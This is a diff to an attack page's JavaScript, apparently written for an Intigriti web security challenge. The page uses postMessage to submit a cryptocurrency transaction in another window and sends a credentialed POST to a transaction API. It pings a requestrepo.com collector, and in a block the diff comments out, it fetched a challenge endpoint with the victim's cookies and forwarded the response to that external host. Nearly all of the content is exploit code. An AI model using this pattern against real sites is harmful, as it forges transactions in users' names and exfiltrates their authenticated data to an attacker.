@@ -8,8 +8,8 @@
         type: "submitTransaction",
         transaction: {
             toAddress: '1647db76b716157f954c706f74641a756f',
-            currency: '1337COIN',
-            amount: 1
+            currency: 'BTC',
+            amount: 'ada'
         }
     };
 
@@ -19,11 +19,11 @@
             win.postMessage(payload, "*");
             fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
         }
-    }, 100);
+    }, 1000);
         
     async function executeAttack() {
         try {
-            const response = await fetch('https://localhost:8000/api/transaction', {
+            const response = await fetch('https://localhost:8080/api/transaction', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 credentials: 'include',
@@ -47,17 +47,17 @@
     
     executeAttack();      
 
-fetch('https://challenge-0126.intigriti.io/api/marketwatch',  {
-  method: "GET",
-  credentials: "include"
-})
-  .then(response => response.text()) 
-  .then(data => {
-    fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
-  })
-  .catch(error => {
-    fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
-  });
+// fetch('https://challenge-0126.intigriti.io/api/marketwatch',  {
+//   method: "GET",
+//   credentials: "include"
+// })
+//   .then(response => response.text()) 
+//   .then(data => {
+//     fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
+//   })
+//   .catch(error => {
+//     fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
+//   });
         
     </script>
 </body>
